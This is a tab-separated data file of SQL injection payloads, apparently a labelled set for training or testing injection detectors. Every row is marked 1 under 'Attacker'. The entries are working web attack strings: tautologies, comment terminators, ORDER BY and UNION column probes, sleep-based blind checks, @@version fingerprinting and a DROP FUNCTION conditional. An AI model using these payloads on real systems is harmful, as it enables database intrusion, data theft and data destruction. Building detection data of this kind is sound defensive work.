Payload	Attacker
'	1
''	1
,	1
""""	1
//	1
\	1
"' or """	1
-- or #	1
' OR 1 -- -	1
""" OR """" = """	1
'='	1
'LIKE'	1
' OR 'x'='x	1
' AND id IS NULL; --	1
/*…*/ 	1
+	1
@variable	1
@@variable	1
AND true	1
AND false	1
1*56	1
-2	1
1' ORDER BY 3--+	1
1' ORDER BY 1,2--+	1
1' GROUP BY 1,2,3--+	1
' GROUP BY columnnames having 1=1 --	1
-1 UNION SELECT 1 INTO @,@	1
-1 UNION SELECT 1 INTO @,@,@	1
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --	1
,(select * from (select(sleep(10)))a)	1
#	1
/*	1
'	1
OR 1=1	1
OR x=y	1
OR 1=1#	1
OR x=y#	1
OR 1=1-- 	1
OR x=y-- 	1
OR 3409=3409 AND ('pytW' LIKE 'pytW	1
HAVING 1=0	1
HAVING 1=1#	1
HAVING 1=0-- 	1
AND 1=1	1
AND 1=0-- 	1
AND 1=1#	1
AND 1=0 AND '%'='	1
AND 1083=1083 AND (1427=1427	1
AND 7506=9091 AND ('5913=5913	1
AND 7300=7300 AND 'pKlZ'='pKlZ	1
AND 7300=7300 AND ('pKlZ'='pKlY	1
AS INJECTX WHERE 1=1 AND 1=1	1
AS INJECTX WHERE 1=1 AND 1=0#	1
AS INJECTX WHERE 1=1 AND 1=1--	1
WHERE 1=1 AND 1=0	1
WHERE 1=1 AND 1=1#	1
WHERE 1=1 AND 1=0--	1
ORDER BY 1-- 	1
ORDER BY 4-- 	1
ORDER BY 5-- 	1
ORDER BY 8-- 	1
ORDER BY 9-- 	1
ORDER BY 12-- 	1
ORDER BY 13-- 	1
ORDER BY 16-- 	1
ORDER BY 17-- 	1
ORDER BY 20-- 	1
ORDER BY 21-- 	1
ORDER BY 24-- 	1
ORDER BY 25-- 	1
ORDER BY 28-- 	1
ORDER BY 29-- 	1
ORDER BY 1# 	1
ORDER BY 2# 	1
ORDER BY 5# 	1
ORDER BY 6# 	1
ORDER BY 9# 	1
ORDER BY 10# 	1
ORDER BY 13# 	1
ORDER BY 14# 	1
ORDER BY 17# 	1
ORDER BY 18# 	1
ORDER BY 21# 	1
ORDER BY 22# 	1
ORDER BY 25# 	1
ORDER BY 26# 	1
ORDER BY 29# 	1
ORDER BY 30#	1
ORDER BY 2 	1
ORDER BY 3 	1
ORDER BY 6 	1
ORDER BY 7 	1
ORDER BY 10 	1
ORDER BY 11 	1
ORDER BY 14 	1
ORDER BY 15 	1
ORDER BY 18 	1
ORDER BY 19 	1
ORDER BY 22 	1
ORDER BY 23 	1
ORDER BY 26 	1
ORDER BY 27 	1
ORDER BY 30 	1
ORDER BY 31337 	1
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--	1
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--	1
and (select substring(@@version,1,1))='X'	1
and (select substring(@@version,1,1))='M'	1
and (select substring(@@version,3,1))='c'	1
and (select substring(@@version,3,1))='S'	1
sleep(5)#	1
